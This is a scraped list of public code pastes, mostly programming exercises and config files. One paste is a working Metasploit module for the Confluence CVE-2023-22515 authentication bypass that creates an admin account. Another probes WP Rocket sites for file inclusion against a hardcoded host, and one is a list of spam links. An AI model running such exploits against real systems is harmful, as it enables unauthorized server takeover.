qzgWCK0X,# bulk_rename_crdownload.py,here2share,Python,Thursday 29th of February 2024 09:47:40 AM CDT,"# bulk_rename_crdownload.py

import os
import tkinter
from tkinter import filedialog

root = tkinter.Tk()
root.withdraw() # Hide the root window
folder = filedialog.askdirectory(parent=root, title=""Choose a folder"")
files = os.listdir(folder)

for file in files:
    if file.endswith("".crdownload""):
        new_file = file.replace("".crdownload"", """")
        os.rename(os.path.join(folder, file), os.path.join(folder, new_file))
        print(f""Renamed {file} to {new_file}"")
    else:
        new_file = file+"".crdownload""
        os.rename(os.path.join(folder, file), os.path.join(folder, new_file))
        print(f""Renamed {file} to {new_file}"")"
KXCQXWDr,Untitled,ZondaKeN,Rust,Thursday 29th of February 2024 09:46:17 AM CDT,"#![allow(warnings)]

use std::cell::Cell;

pub struct Model
{
    x: i32
}

pub struct View<'a> {
    model: &'a Cell<Model>,
}

pub struct Controller<'a> {
    model: &'a Cell<Model>,
    view: &'a View<'a>,
}

impl View<'_>
{
    pub fn render(&self)
    {
        println!(""Render..."");
    }
}

trait Observer<T1>
{
    fn invoke(&self, arg1: T1);
}

struct Event<T1>
{
    subscribers: Vec<Box<dyn Observer<T1>>>
}

impl<T1> Event<T1>
{
    fn subscribe(&mut self, arg: impl Observer<T1> + 'static)
    {
        self.subscribers.push(Box::new(arg));
    }

    fn invoke(&self, arg1: T1) where T1 : Clone
    {
        for subscriber in &self.subscribers
        {
            subscriber.invoke(arg1.clone());
        }
    }
}

impl<'a> Controller<'a>
{
    pub fn new(model: &'a Cell<Model>, view: &'a View<'a>) -> Self
    {
        let controller = Controller { model, view };
        //view.add_observer(ViewObserver {});
        return controller;
    }

    pub fn run(&mut self)
    {
        self.view.render();
    }
}

fn main() {
    let model = Cell::new(Model { x: 42 });
    let view = View { model: &model };
    let mut controller = Controller::new(&model, &view);
    controller.run();
}
"
xr47MGTm,CombiningIntoOneCollection,UrayFenn,C#,Thursday 29th of February 2024 09:22:15 AM CDT,"namespace CombiningIntoOneCollection
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] firstNumbers = { 1, 2, 1 };
            int[] secondNumbers = { 3, 2 };
            List<int> list = new List<int>();

            AddValue(list, firstNumbers);
            AddValue(list, secondNumbers);
            EnumerationNumber(list);
        }

        static void AddValue(List<int> list, int[] array)
        {
            for (int i = 0; i < array.Length; i++)
            {
                if (list.Contains(array[i]) == false)
                {
                    list.Add(array[i]);
                }
            }
        }

        static void EnumerationNumber(List<int> list)
        {
            foreach (var number in list)
            {
                Console.Write(number + "" "");
            }
        }
    }
}"
gkqPPLrC,Atlassian Confluence Data Center and Server - Authentication Bypass (Metasploit) - CVE-2023-22515,FlyFar,Python,Thursday 29th of February 2024 09:19:04 AM CDT,"##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Atlassian Confluence Data Center and Server Authentication Bypass via Broken Access Control',
        'Description' => %q{
          This module exploits a broken access control vulnerability in Atlassian Confluence servers leading to an authentication bypass.
          A specially crafted request can be create new admin account without authentication on the target Atlassian server.
        },
        'Author' => [
          'Unknown', 
          'Emir Polat' # metasploit module
        ],
        'References' => [
          ['CVE', '2023-22515'],
          ['URL', 'https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-22515'],
          ['URL', 'https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis']
        ],
        'DisclosureDate' => '2023-10-04',
        'DefaultOptions' => {
          'RPORT' => 8090
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username], regex: /^[a-z._@]+$/),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/login.action')
    )
    return Exploit::CheckCode::Unknown unless res
    return Exploit::CheckCode::Safe unless res.code == 200

    poweredby = res.get_xml_document.xpath('//ul[@id=""poweredby""]/li[@class=""print-only""]/text()').first&.text
    return Exploit::CheckCode::Safe unless poweredby =~ /Confluence (\d+(\.\d+)*)/

    confluence_version = Rex::Version.new(Regexp.last_match(1))

    vprint_status(""Detected Confluence version: #{confluence_version}"")

    if confluence_version.between?(Rex::Version.new('8.0.0'), Rex::Version.new('8.3.2')) ||
       confluence_version.between?(Rex::Version.new('8.4.0'), Rex::Version.new('8.4.2')) ||
       confluence_version.between?(Rex::Version.new('8.5.0'), Rex::Version.new('8.5.1'))
      return Exploit::CheckCode::Appears(""Exploitable version of Confluence: #{confluence_version}"")
    end

    Exploit::CheckCode::Safe(""Confluence version: #{confluence_version}"")
  end

  def run
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/server-info.action'),
      'vars_get' => {
        'bootstrapStatusProvider.applicationConfig.setupComplete' => 'false'
      }
    )

    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Version vulnerable but setup is already completed') unless res&.code == 302 || res&.code == 200

    print_good('Found server-info.action! Trying to ignore setup.')

    created_user = create_admin_user

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/finishsetup.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      }
    )

    return fail_with(Msf::Exploit::Failure::NoAccess, 'The admin user could not be created. Try a different username.') unless created_user

    print_warning('Admin user was created but setup could not be completed.') unless res&.code == 200

    create_credential({
      workspace_id: myworkspace_id,
      origin_type: :service,
      module_fullname: fullname,
      username: datastore['NEW_USERNAME'],
      private_type: :password,
      private_data: datastore['NEW_PASSWORD'],
      service_name: 'Atlassian Confluence',
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      protocol: 'tcp',
      status: Metasploit::Model::Login::Status::UNTRIED
    })

    print_good(""Admin user was created successfully. Credentials: #{datastore['NEW_USERNAME']} - #{datastore['NEW_PASSWORD']}"")
    print_good(""Now you can login as administrator from: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}login.action"")
  end

  def create_admin_user
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'setup/setupadministrator.action'),
      'headers' => {
        'X-Atlassian-Token' => 'no-check'
      },
      'vars_post' => {
        'username' => datastore['NEW_USERNAME'],
        'fullName' => 'New Admin',
        'email' => datastore['NEW_EMAIL'],
        'password' => datastore['NEW_PASSWORD'],
        'confirm' => datastore['NEW_PASSWORD'],
        'setup-next-button' => 'Next'
      }
    )
    res&.code == 302
  end
end
            "
jJskKadi,WP Rocket < 2.10.3 - Local File Inclusion (LFI),FlyFar,Python,Thursday 29th of February 2024 09:16:55 AM CDT,"
import requests
import time

def check_wp_rocket_version(url):
    version_url = url + ""/wp-rocket/css/rocket.css""
    try:
        response = requests.get(version_url)
        version = response.headers[""X-Powered-By""]
        if ""WP Rocket/"" in version:
            version = version.split(""/"")[1]
            return version
    except Exception as e:
        print(f""Error occurred while fetching WP Rocket version: {e}"")
    return None

def test_wp_rocket_lfi_bug(url):
    lfi_url = url + ""/wp-rocket/inc/vendor/composer/installed.json""
    try:
        response = requests.get(lfi_url)
        if response.status_code == 200:
            return True
    except Exception as e:
        print(f""Error occurred while testing LFI: {e}"")
    return False

def main():
    url = ""http://arvatools.com""
    wp_rocket_version = check_wp_rocket_version(url)
    if wp_rocket_version:
        print(f""WP Rocket Version: {wp_rocket_version}"")
        if wp_rocket_version in [""2.10.0"", ""2.10.1"", ""2.10.2"", ""2.10.3""]:
            result = test_wp_rocket_lfi_bug(url)
            if result:
                print(""LFI vulnerability found in WP Rocket"")
            else:
                print(""LFI vulnerability not found in WP Rocket"")
        else:
            print(""WP Rocket version is not affected by the LFI bug"")
    else:
        print(""Unable to fetch WP Rocket version"")

if __name__ == ""__main__"":
    main()
            "
z86mPLNs,PersonnelAccountingAdvance,UrayFenn,C#,Thursday 29th of February 2024 09:11:15 AM CDT,"namespace PersonnelAccountingAdvance
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandAddDossier = ""1"";
            const string CommandShowAllDossier = ""2"";
            const string CommandDeleteDossier = ""3"";
            const string CommandExitProgram = ""4"";

            Dictionary<string, string> listEmployees = new Dictionary<string, string>();
            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""Выберите команду:"");
                Console.WriteLine($""{CommandAddDossier} - Добавить досье."");
                Console.WriteLine($""{CommandShowAllDossier} - Показать список всех досье."");
                Console.WriteLine($""{CommandDeleteDossier} - Удалить досье."");
                Console.WriteLine($""{CommandExitProgram} - Выход их программы."");
                string userInput = Console.ReadLine();
                Console.Clear();

                switch (userInput)
                {
                    case CommandAddDossier:
                        AddDossier(listEmployees);
                        break;

                    case CommandShowAllDossier:
                        ShowAllDossier(listEmployees);
                        break;

                    case CommandDeleteDossier:
                        DeleteDossier(listEmployees);
                        break;

                    case CommandExitProgram:
                        Console.WriteLine(""Вы вышли из программы."");
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Некорректный ввод, попробуйте ввести другую команду."");
                        break;
                }
            }
        }

        static void AddDossier(Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Укажите имя сотрудника:"");
            string employeeName = Console.ReadLine();
            Console.WriteLine(""Укажите должность сотрудника:"");
            string employeePosition = Console.ReadLine();

            if (listEmployees.ContainsKey(employeeName))
            {
                Console.WriteLine($""{employeeName} - Уже есть в списке сотрудников."");
            }
            else
            {
                Console.WriteLine($""{employeeName} - Добавлен в список"");
                listEmployees.Add(employeeName, employeePosition);
            }
        }

        static void ShowAllDossier (Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Список всех сотрудников:"");

            foreach(var file in listEmployees)
            {
                Console.WriteLine(file.Key + "" "" + file.Value + "" - "");
            }
        }

        static void DeleteDossier(Dictionary<string, string> listEmployees)
        {
            Console.WriteLine(""Укажите имя сотрудника для удаления досье:"");
            string userInput = Console.ReadLine();

            if (listEmployees.ContainsKey(userInput))
            {
                Console.WriteLine($""Досье {userInput} {listEmployees[userInput]} - удалено!"");
                listEmployees.Remove(userInput);
            }
            else
            {
                Console.WriteLine(""Досье такого сотрудника не обнаружено."");
            }
        }
    }
}"
iTLx7VYs,majong,excellent940707,C++,Thursday 29th of February 2024 08:54:14 AM CDT,"#include<bits/stdc++.h>
using namespace std;
bool check(int count_two, int cnt[]){

    bool is_zero=1;
    for(int i=0;i<34;++i){
        if(cnt[i]>0){
            is_zero=0;
            break;
        }
    }
    if(is_zero)return 1;

    bool valid=0;
    for(int i=0;i<34;++i){
        if(cnt[i]>=3){
            cnt[i]-=3;
            valid |= check(count_two, cnt);
            cnt[i]+=3;
        }
    }
    if(count_two>0){
        for(int i=0;i<34;++i){
            if(cnt[i]>=2){
                cnt[i]-=2;
                valid |= check(count_two-1, cnt);
                cnt[i]+=2;
            }
        }
    }
    for(int i=0;i<=6;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=9;i<=15;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=18;i<=24;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
     for(int i=27;i<=31;++i){
          if(cnt[i]>0&&cnt[i+1]>0&&cnt[i+2]>0){
               cnt[i]-=1;
               cnt[i+1]-=1;
               cnt[i+2]-=1;
               valid |= check(count_two, cnt);
               cnt[i]+=1;
               cnt[i+1]+=1;
               cnt[i+2]+=1;
          }
     }
    return valid;
}
int main() {
     int num,cnt[34]={0};
     for(int i=0;i<17;++i){
        cin>>num;
        cnt[num]+=1;
     }
     cout<<check(1,cnt)<<'\n';
    return 0;
}"
WL3jL4Hu,HanomanPribadi,PapiGemezs,PHP,Thursday 29th of February 2024 08:45:18 AM CDT,"{
   ""Pribadi"": [
      {
         ""version"": 1.1
      }
   ]
}"
yKECnWfX,widgets,denogginizer,YAML,Thursday 29th of February 2024 08:37:04 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/service-widgets
# - logo:
    # icon: https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/I_Love_New_York.svg/1101px-I_Love_New_York.svg.png # optional
- resources:
    label: Open Media Vault
    cpu: true
    memory: true
    disk: /
    cputemp: true
    uptime: true
    units: imperial


- search:
    provider: duckduckgo
    target: _blank
- datetime:
    text_size: sm
    format:
      dateStyle: short
      timeStyle: short
- openweathermap:
    #label: Home #optional
    latitude: your lat
    longitude: your long
    units: imperial # or imperial
    provider: openweathermap
    apiKey: your-api # required only if not using provider, this reveals api key in requests
    cache: 5 # Time in minutes to cache API responses, to stay within limits"
L8CFmryK,docker,denogginizer,YAML,Thursday 29th of February 2024 08:36:28 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/docker/

my-docker:
   host: homepage-dockerproxy
   port: 2375
my-docker-dagobah:
   host: 192.168.50.105
   port: 2375
"
mTVRCEex,awefdvesntes,gadungw71,PHP,Thursday 29th of February 2024 08:33:54 AM CDT,"https://www.charidy.com/1709189305582777975
https://www.charidy.com/1709189656213528682
https://www.charidy.com/1709190130104794165
https://eymmzy9298.expandcart.com/index.php?route=product/product&product_id=373
https://eymmzy9298.expandcart.com/index.php?route=product/product&product_id=374
https://ytvggc0896.expandcart.com/index.php?route=product/product&product_id=373
https://ytvggc0896.expandcart.com/index.php?route=product/product&product_id=374
https://filqhd1863.expandcart.com/index.php?route=product/product&product_id=373
https://filqhd1863.expandcart.com/index.php?route=product/product&product_id=374
https://www.taskade.com/p/hd-01HQSX4PYVX4CR431SQQAE75RE
https://www.taskade.com/p/hd-01HQSXMPX9EQSW53W92QR19NJH
https://www.taskade.com/p/2024-tw-01HQSXV0ZN0R8JHRXHHQ6P4J3N
https://github.com/napicudayav1
https://github.com/orgs/mobiggr/discussions/3186
https://github.com/tevaxusenuv15
https://github.com/hayufisik
https://github.com/orgs/mobiggr/discussions/3198
https://github.com/dagosikoyep
https://github.com/orgs/mobiggr/discussions/3233
https://github.com/ziduxodeben17
https://github.com/orgs/mobiggr/discussions/3234
https://github.com/batetevorix19
https://github.com/orgs/mobiggr/discussions/3238
https://demo.hedgedoc.org/s/pqeFJCxfA
https://paiza.io/projects/yhCf45nFs2qKkTulezl2Rg?language=php
https://pastelink.net/9nheybiz
https://hackmd.io/@rerewilli6/HJBi4G0h6
https://snippet.host/whtudm
https://tempaste.com/3ksUNKMXgYE
https://rentry.co/rro455dw
https://binshare.net/SyKOC9FFQKgjRNqsELQA
https://rift.curseforge.com/paste/fb874ebe
https://telegra.ph/slowewww-02-29"
tWn51GHk,settings,denogginizer,YAML,Thursday 29th of February 2024 08:30:32 AM CDT,"---
# For configuration options and examples, please see:
# https://gethomepage.dev/latest/configs/settings
title: Start

providers:
  openweathermap: your-api
  weatherapi: your-api
  
background:
  #image: https://images.unsplash.com/photo-1502790671504-542ad42d5189?auto=format&fit=crop&w=2560&q=80
  image: /images/satellite_03.jpg
  blur: sm # sm, """", md, xl... see https://tailwindcss.com/docs/backdrop-blur
  saturate: 50 # 0, 50, 100... see https://tailwindcss.com/docs/backdrop-saturate
  brightness: 50 # 0, 50, 75... see https://tailwindcss.com/docs/backdrop-brightness
  opacity: 50 # 0-100
  
headerStyle: clean

# color: stone
color: sky

showStats: true
  
layout:

  Home:
    tab: Home
    style: row
    columns: 2
    useEqualHeights: true

  Server Monitor:
    tab: Server Monitor
    style: row
    columns: 3
  Disk Usage:
    tab: Disk Usage
    style: row
    columns: 4
    
  Containers:
    tab: Containers
    style: row
    columns: 3

  Media:
    tab: Media
    style: row
    columns: 4
    
  Streaming Now:
    tab: Streaming Now
    style: row
    columns: 2
    
  Feeds:
    tab: Feeds
    style: column
    columns: 2

  Bookmark Group on Fourth Tab:
    style: row
    columns: 6

  Service Group on every Tab:
    style: row
    columns: 6
"
02P1KkGQ,final B,_ums_,Go,Thursday 29th of February 2024 08:18:48 AM CDT,"package main

import (
	""fmt""
	""io/ioutil""
	""sort""
	""strconv""
	""strings""
)

type Node struct {
	value int
	left  *Node
	right *Node
}

type tTmpStore struct {
	leftIndex  int
	rightIndex int
}

func slice2BinaryTree(ss []string, n int) (*Node, []int) {
	if len(ss) == 0 {
		return nil, nil
	}
	var allKeys []int
	myset := make(map[int]bool)
	list := make([]*Node, n)
	m := make(map[int]tTmpStore, n)
	for i := 0; i < n; i++ {
		ss[i] = strings.TrimSpace(ss[i])
		if ss[i] == """" {
			continue
		}

		tmp := strings.Split(ss[i], "" "")
		if len(tmp) < 4 {
			panic(""wrong tree data '"" + ss[i] + ""'"")
		}

		list[i] = &Node{}
		list[i].value, _ = strconv.Atoi(tmp[1])
		myset[list[i].value] = true
		ts := tTmpStore{}
		if tmp[2] != ""-1"" {
			ts.leftIndex, _ = strconv.Atoi(tmp[2])
		}
		if tmp[3] != ""-1"" {
			ts.rightIndex, _ = strconv.Atoi(tmp[3])
		}

		m[i] = ts
	}
	for key, _ := range myset {
		allKeys = append(allKeys, key)
	}
	sort.Ints(allKeys)

	for i := 0; i < n; i++ {
		ts := m[i]
		if ts.leftIndex != 0 {
			list[i].left = list[ts.leftIndex-1]
		}
		if ts.rightIndex != 0 {
			list[i].right = list[ts.rightIndex-1]
		}
	}

	return list[0], allKeys
}

func checkCorrectBst(tree *Node, allKeys map[int]bool) int {
	if tree == nil {
		return 0
	}
	if allKeys[tree.value] != true {
		panic(""Unknown key"")
	}
	size := 1

	if tree.left != nil {
		if tree.left.value > tree.value {
			panic(""Left child is bigger than its parent"")
		}
		size += checkCorrectBst(tree.left, allKeys)
	}
	if tree.right != nil {
		if tree.right.value < tree.value {
			panic(""Right child is smaller than its parent"")
		}
		size += checkCorrectBst(tree.right, allKeys)
	}
	return size
}

// through input.txt
func main() {
	bs, err := ioutil.ReadFile(""input.txt"")
	if err != nil {
		panic(err)
	}

	ss := strings.Split(string(bs), ""\n"")
	if len(ss) < 2 {
		panic(""wrong input"")
	}
	test_type := ss[0]
	n, _ := strconv.Atoi(ss[1])
	tree := &Node{}
	tree = nil
	allKeys := make([]int, 0)
	if n > 0 {
		tree, allKeys = slice2BinaryTree(ss[2:], n)
	}
	if test_type == ""correctness"" {
		toRemove, _ := strconv.Atoi(ss[n+2])
		tree = remove(tree, toRemove)
		myset := make(map[int]bool)
		expectedSize := len(allKeys)

		for _, key := range allKeys {
			myset[key] = true
			if key == toRemove {
				expectedSize -= 1
			}
		}
		actualSize := checkCorrectBst(tree, myset)
		if actualSize != expectedSize {
			panic(""Size of Bst does not match with the answer"")
		}
		fmt.Println(""Correct"")
	} else {
		for _, key := range allKeys {
			tree = remove(tree, key)
		}
		if tree != nil {
			fmt.Println(""FAIL: non-null"")
		} else {
			fmt.Println(""OK: null"")
		}
	}
}

func remove(node *Node, key int) *Node {

	// если дерево пустое
	if node == nil {
		return nil
	}

	deletedNode, prev := findNode(node, nil, key)

	if deletedNode == nil {
		return node
	}

	if deletedNode.right == nil || deletedNode.left == nil {
		var newNode *Node

		if deletedNode.left == nil {
			newNode = deletedNode.right
		} else {
			newNode = deletedNode.left
		}

		if prev == nil {
			return newNode
		}

		if deletedNode == prev.left {
			prev.left = newNode
		} else {
			prev.right = newNode
		}

		deletedNode = nil
	} else {

		leftMaxNode, prevLeftMaxNode := findLeftMaxNode(deletedNode.left, deletedNode)
		deletedNode.value = leftMaxNode.value
		prevLeftMaxNode.right = nil
		leftMaxNode = nil
	}

	return node
}

func findNode(root *Node, prev *Node, value int) (*Node, *Node) {
	if root == nil {
		return nil, nil
	}

	if value < root.value {
		return findNode(root.left, root, value)
	}

	if value > root.value {
		return findNode(root.right, root, value)
	}

	var node *Node
	if value == root.value {
		node = root
	}

	return node, prev
}

func findLeftMaxNode(node, prev *Node) (*Node, *Node) {
	root := node
	for root.right != nil {
		prev = root
		root = root.right
	}
	return root, prev
}
"
mbH8FuW7,Lesson22,smatskevich,C++,Thursday 29th of February 2024 07:55:40 AM CDT,"#include <iostream>
using namespace std;
struct Node {
  int Data;
  Node* Left = nullptr;
  Node* Right = nullptr;
};

void DFS(Node* node) {
  cout << node->Data << "" "";
  if (node->Left) {
    DFS(node->Left);
    cout << node->Data << "" "";
  }
  if (node->Right) {
    DFS(node->Right);
    cout << node->Data << "" "";
  }
}

int main1() {
  Node* root = nullptr;
  int x;
  while (cin >> x, x != 0) {
    if (!root) {
      root = new Node();
      root->Data = x;
      continue;
    }
    Node* node = root;
    while (true) {
      if (node->Data == x) break;
      if (node->Data < x) {
        if (node->Right == nullptr) {
          node->Right = new Node();
          node->Right->Data = x;
          break;
        }
        node = node->Right;
      } else {
        if (node->Left == nullptr) {
          node->Left = new Node();
          node->Left->Data = x;
          break;
        }
        node = node->Left;
      }
    }
  }
  DFS(root);
  return 0;
}

void PreOrderDFS(vector<vector<int>>& t, int u, int p) {
  cout << u << ""\n"";
  for (int v : t[u]) {
    if (v != p)
      PreOrderDFS(t, v, u);
  }
}

int main() {
  int n; cin >> n;
  vector<vector<int>> t(n + 1);
  for (int i = 0; i < n - 1; ++i) {
    int u, v; cin >> u >> v;
    t[u].push_back(v);
    t[v].push_back(u);
  }
  PreOrderDFS(t, 1, -1);
}"
5WWbsjLF,Untitled,asmo12,Batch,Thursday 29th of February 2024 07:55:06 AM CDT,"@echo off
SETLOCAL ENABLEEXTENSIONS 
:: use command  - this_batch_file.cmd src trg 
:: src [in]     - source file name to be converted
:: trg [in,opt] - target file name, leave blank for in-place conversion

set src=%~1
set trg=%~2
set tmp=%temp%.\%~nx1
if ""%trg%""=="""" set trg=%src%

:header
for /f ""delims="" %%a in (%src%) do (
    echo %%a > %tmp%
    goto :body
)

:body
CHCP 1251 >NUL
cmd /D /A /c type ""%src%"" | find /v /i "",contract_date,"">>""%tmp%""
move /y ""%tmp%"" ""%trg%""

ECHO Check your new %trg% in:
ECHO %~ftz1%
PAUSE"
x1rj7zkb,Exemplos de set e get de arrays em Delphi,jacknpoe,Delphi,Thursday 29th of February 2024 07:38:49 AM CDT,"unit Classe;

interface

Type
TClasse = class
  private
    fQuantidade: integer;
    fPagamentos: array of integer;
    fPesos: array of double;
  public
    function GetQuantidade: integer;
    procedure SetQuantidade(valor: integer);
    function GetPagamentos(indice: integer): integer;
    procedure SetPagamentos(indice: integer; valor: integer);
    function GetPesos(indice: integer): double;
    procedure SetPesos(indice: integer; valor: double);

    property Quantidade: integer read GetQuantidade write SetQuantidade;
    property Pagamentos[indice: integer]: integer read GetPagamentos write SetPagamentos;
    property Pesos[indice: integer]: double read GetPesos write SetPesos;
end;

implementation

function TJuros.GetQuantidade: integer;
begin
  result := fQuantidade;
end;

procedure TJuros.SetQuantidade(valor: integer);
begin
  if (valor < 0) then
  begin
    exit;
  end;
  fQuantidade := valor;
  SetLength(fPagamentos, valor);
  SetLength(fPesos, valor);
end;

function TJuros.GetPagamentos(indice: integer): integer;
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    result := 0;
    exit;
  end;
  result := fPagamentos[indice];
end;

procedure TJuros.SetPagamentos(indice: integer; valor: integer);
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    exit;
  end;
  fPagamentos[indice] := valor;
end;

function TJuros.GetPesos(indice: integer): double;
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    result := 0.0;
    exit;
  end;
  result := fPesos[indice];
end;

procedure TJuros.SetPesos(indice: integer; valor: double);
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    exit;
  end;
  fPesos[indice] := valor;
end;

end."
hj8HsMyy,rnak,nirajs,Python,Thursday 29th of February 2024 06:46:49 AM CDT,"""""""
votes = [""ABC"",""ACB"",""ABC"",""ACB"",""ACB""]

1st Post ->
A -> 5
B -> 2
C -> 3
D -> 0

A -> []
B -> []


""""""

from collections import defaultdict
class Solution:
    def rankTeams(self, votes: list[str]) -> str:
        ranking = defaultdict(lambda: [0 for x in range(len(votes[0]))])
        for vote in votes:
            for index, c in enumerate(vote):
                ranking[c][index] -= 1
        sorted_teams = sorted(ranking.items(), key=lambda item: (item[1], item[0]))
        print(sorted_teams)
        return """".join(x for x,_ in sorted_teams)

    def rankTeams1(self, votes: list[str]) -> str:
        ranking = defaultdict(lambda: [0 for _ in range(len(votes[0]))])

        for vote in votes:
            for index, c in enumerate(vote):
                    ranking[c][index] += 1
        sorted_teams = sorted(ranking.keys())
        print(sorted_teams)
        return """".join(sorted(sorted_teams, key=lambda x: ranking[x], reverse=True))

    # def testing(self):
    #     c = ""c""
    #     c


sol = Solution()
votes1 = [""ABC"",""ACB"",""ABC"",""ACB"",""ACB""]
votes2 = [""BCA"",""CAB"",""CBA"",""ABC"",""ACB"",""BAC""]
print(sol.rankTeams1(votes2))"
YExduMBw,Untitled,White_Blue,Pawn,Thursday 29th of February 2024 06:45:04 AM CDT,"#if defined _dof2_included
	#endinput
#endif
#define _dof2_included

#include <a_samp>

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

/*
 * This is a new version of the INI script Double-O-Files.
 * However, it's has completely been rewritten and has now a much better performance.
 * There is also the support for sections in the INI file. (But there is no support for comments.)
 * Double-O-Files 2 is compatible with DUDB, DINI, Double-O-Files and possibly y_ini since it
 * can handle sections and entry of the format ""key = value"", not only ""key=value"".
 * The number of spaces between the equal sign and key and value can actually be arbitrary.
 * I've added some comments below. You may see that I've mentioned the big-O-notation,
 * 'n' always Entries.Count.
 * Double-O-Files 2 should also be useful for Russian letter because I'm using
 * the functions fgetchar and fputchar to write and read the files.
 *
 * There is another new feature which has been inspired by ZCMD and y_ini:
 * The OnParseFile callbacks. To learn more about it, read the description in
 * the SA-MP forums if you haven't already.
 * THE END
 */

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

/*
native DOF2_SetFile(file[]);
native DOF2_LoadFile();
native DOF2_SaveFile();
native DOF2_ParseFile(file[],extraid,bool:callback=true);
native DOF2_ReparseFile(file[],extraid,bool:callback=true);
native DOF2_WriteFile();
native DOF2_PrintFile(comment[]="""");
native DOF2_GetString(file[],key[],tag[]="""");
native DOF2_GetStringEx(file[],key[],result[],size,tag[]="""");
native Float:DOF2_GetFloat(file[],key[]);
native DOF2_GetInt(file[],key[],tag[]="""");
native DOF2_GetHex(file[],key[],tag[]="""");
native DOF2_GetBin(file[],key[],tag[]="""");
native bool:DOF2_GetBool(file[],key[],tag[]="""");
native DOF2_SetString(file[],key[],value[],tag[]="""");
native DOF2_SetFloat(file[],key[],Float:value);
native DOF2_SetInt(file[],key[],value,tag[]="""");
native DOF2_SetHex(file[],key[],value,tag[]="""");
native DOF2_SetBin(file[],key[],value,tag[]="""");
native DOF2_SetBool(file[],key[],bool:value,tag[]="""");
native DOF2_IsSet(file[],key[],tag[]="""");
native DOF2_Unset(file[],key[],tag[]="""");
native DOF2_FileExists(file[]);
native DOF2_RemoveFile(file[]);
native DOF2_CreateFile(file[],password[]="""");
native DOF2_RenameFile(oldfile[],newfile[]);
native DOF2_RenameKey(file[],oldkey[],newkey[],tag[]="""");
native DOF2_CopyFile(filetocopy[],newfile[]);
native DOF2_CheckLogin(file[],password[]);
native DOF2_File(user[]);
native DOF2_ParseInt();
native DOF2_ParseFloat();
native DOF2_ParseBool();
native DOF2_ParseBin();
native DOF2_ParseHex();
native DOF2_SetUTF8(bool:set);
native bool:DOF2_GetUTF8();
native DOF2_GetFile();
native DOF2_MakeBackup(file[]);
native DOF2_RemoveSection (file [], tag []);
native DOF2_SectionExists (file [], tag []);
native DOF2_SortSection (file [], tag [], bool: ignorecase = true, bool: ascending = true);
native DOF2_SortAllSections (file [], bool: ignorecase = true, bool: ascending = true);
native DOF2_SetCaseSensitivity (bool: set);
native DOF2_GetCaseSensitivity ();
*/

#define DOF2_TagExists  DOF2_SectionExists
#define DOF2_RemoveTag  DOF2_RemoveSection

// OnParseFile <Tag><Key>(extraid, value [])
// OnParseFile <><Key>(extraid, value [])
// OnDefaultParseFile (extraid, value [], key [], tag [], file [])

// The arguments of your OnParseFile functions may have arbitrary names but must be an integer followed by a string.
// Function must return a value.
#define OnParseFile<%0><%1>(%2) \
	forward _OnParseFile_%0_%1 (extraid, value []); \
	public _OnParseFile_%0_%1 (extraid, value []) \
